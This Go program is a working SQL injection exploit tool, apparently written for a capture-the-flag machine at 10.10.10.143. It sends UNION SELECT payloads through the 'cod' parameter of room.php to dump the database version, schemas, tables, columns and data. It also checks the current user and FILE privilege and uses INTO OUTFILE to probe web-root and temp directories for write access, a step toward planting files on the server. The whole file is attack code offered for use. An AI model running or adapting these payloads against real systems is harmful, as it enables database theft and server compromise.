package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"strings"

	"golang.org/x/net/html"
)

type Result struct {
	success bool
	result  string
}

type Exploit struct {
	Url     string
	UriPath string
}

func (e *Exploit) PrintResult(res Result) {
	if !res.success {
		fmt.Println("[-] Exploit failed!.... Abort")
		return
	}
	fmt.Printf("[+] Exploit result: %s \n", res.result)
}

func (e *Exploit) enumerateFilePrivilege() Result {
	res := Result{
		success: false,
		result:  "",
	}

	sqliURL := fmt.Sprintf("%s%s", e.Url, e.UriPath)
	resp, err := http.Get(sqliURL)
	if err != nil {
		fmt.Printf("[-] HTTP request failed for: %s\n", err)
		return res
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Failed to read the response body: %s\n", err)
		return res
	}

	res.success = true
	res.result = string(body)

	return res
}

func (e *Exploit) enumerateDatabase(payload string) Result {
	payload = strings.ReplaceAll(payload, " ", "%20")
	fmt.Printf("[+] Payload: %s\n", payload)

	res := Result{
		success: false,
		result:  "",
	}

	sqliURL := fmt.Sprintf("%s%s%s", e.Url, e.UriPath, payload)
	resp, err := http.Get(sqliURL)
	if err != nil {
		fmt.Printf("[-] HTTP request failed for: %s\n", err)
		return res
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Failed to read the response body: %s\n", err)
		return res
	}

	payloadResult := parseHTMLForH3(string(body))
	if payloadResult == "" {
		fmt.Println("[-] No result :(")
		return res
	}

	res.success = true
	res.result = payloadResult
	return res
}

func parseHTMLForH3(htmlContent string) string {
	doc, err := html.Parse(strings.NewReader(htmlContent))
	if err != nil {
		fmt.Printf("[-] Failed to parse HTML: %s", err)
		return ""
	}

	var traverse func(*html.Node) string
	traverse = func(node *html.Node) string {
		if node.Type == html.ElementNode && node.Data == "h3" && node.FirstChild != nil {
			if node.FirstChild.Type == html.ElementNode && node.FirstChild.Data == "a" && node.FirstChild.FirstChild != nil {
				return node.FirstChild.FirstChild.Data
			} else if node.FirstChild.Type == html.TextNode {
				return node.FirstChild.Data
			}
		}

		for child := node.FirstChild; child != nil; child = child.NextSibling {
			res := traverse(child)
			if res != "" {
				return res
			}
		}
		return ""
	}

	return traverse(doc)
}

func versionExploit(exploit *Exploit) Result {
	fmt.Println("[+] Version Exploit --------------------------------------------------------------------------------------")

	payload := "7 UNION ALL SELECT 1,@@version,3,4,5,6,7; -- -"
	return exploit.enumerateDatabase(payload)
}

func schemaExploit(exploit *Exploit) Result {
	fmt.Println("[+] Schema Exploit --------------------------------------------------------------------------------------")

	payload := "7 UNION ALL SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6,7 FROM information_schema.schemata; -- -"
	return exploit.enumerateDatabase(payload)
}

func tableExploit(exploit *Exploit, schemaName string) Result {
	fmt.Println("[+] Tables Exploit --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema='%s'; -- -", schemaName)
	return exploit.enumerateDatabase(payload)
}

func columnExploit(exploit *Exploit, tableName string) Result {
	fmt.Println("[+] Columns Exploit --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_name='%s'; -- -", tableName)
	return exploit.enumerateDatabase(payload)
}

func dataExploit(exploit *Exploit, tableName string, columnName string) Result {
	fmt.Println("[+] Data Exploit --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(%s),3,4,5,6,7 FROM %s; -- -", columnName, tableName)
	return exploit.enumerateDatabase(payload)
}

func customExploit(exploit *Exploit, tableName string, columnName string) Result {
	fmt.Println("[+] Data Exploit --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,%s,3,4,5,6,7 FROM %s; -- -", columnName, tableName)
	return exploit.enumerateDatabase(payload)
}

func checkCurrentUser(exploit *Exploit) Result {
	fmt.Println("[+] Checking Current User --------------------------------------------------------------------------------------")

	payload := "7 UNION ALL SELECT 1,CURRENT_USER(),3,4,5,6,7; -- -"
	return exploit.enumerateDatabase(payload)
}

func checkFilePriveleges(exploit *Exploit) Result {
	fmt.Println("[+] Checking FILE Privileges --------------------------------------------------------------------------------------")

	payload := "7 UNION ALL SELECT 1,secure_file_priv,3,4,5,6,7; -- -"
	return exploit.enumerateDatabase(payload)
}

func checkWriteableDirectory(exploit *Exploit, dir string) Result {
	fmt.Println("[+] Checking Writeable Directory --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,'%s',3,4,5,6,7 INTO OUTFILE '%scheck.txt'; -- -", dir, dir)
	exploit.enumerateDatabase(payload)

	exploit.UriPath = "/check.txt"
	return exploit.enumerateFilePrivilege()
}

func formatColumnNames(input string) string {
	parts := strings.Split(input, ",")

	var result []string
	for i, part := range parts {
		result = append(result, part)
		if i < len(parts)-1 {
			result = append(result, "0x7c")
		}
	}
	output := strings.Join(result, ",")

	return output
}

func main() {
	url := "http://10.10.10.143"
	uriPath := "/room.php?cod="
	exploit := Exploit{
		Url:     url,
		UriPath: uriPath,
	}

	version := flag.Int("v", 0, "Gets the version of teh database")
	dbName := flag.Int("d", 0, "Enumerates schemas from the databases")
	schemaName := flag.String("s", "", "Enumerates dbs from the schema name")
	tableName := flag.String("t", "", "Enumerates tables from the db name")
	columnName := flag.String("c", "", "Enumerates columns from the table name and aggregates all data of columns with a separator")
	checkUser := flag.Int("check-user", 0, "Checks current user")
	checkFile := flag.Int("check-file", 0, "Checks file privileges")
	checkWrite := flag.Int("check-write", 0, "Checks writable directories")
	flag.Parse()

	if *version == 1 {
		res := versionExploit(&exploit)
		exploit.PrintResult(res)
	}

	if *dbName == 1 {
		res := schemaExploit(&exploit)
		exploit.PrintResult(res)
	}

	if *schemaName != "" {
		res := tableExploit(&exploit, *schemaName)
		exploit.PrintResult(res)
	}

	if *tableName != "" && *columnName != "" {
		res := customExploit(&exploit, *tableName, *columnName)
		exploit.PrintResult(res)
	}

	if *tableName != "" && *columnName == "" {
		res := columnExploit(&exploit, *tableName)
		exploit.PrintResult(res)

		*columnName = formatColumnNames(res.result)
		res = dataExploit(&exploit, *tableName, *columnName)
		exploit.PrintResult(res)
	}

	if *checkUser == 1 {
		res := checkCurrentUser(&exploit)
		exploit.PrintResult(res)
	}

	if *checkFile == 1 {
		res := checkFilePriveleges(&exploit)
		exploit.PrintResult(res)
	}

	if *checkWrite == 1 {
		directories := []string{
			"/var/www/html/",
			"/tmp/",
			"/var/lib/mysql-files/",
		}

		for _, dir := range directories {
			res := checkWriteableDirectory(&exploit, dir)
			exploit.PrintResult(res)
		}
	}
}
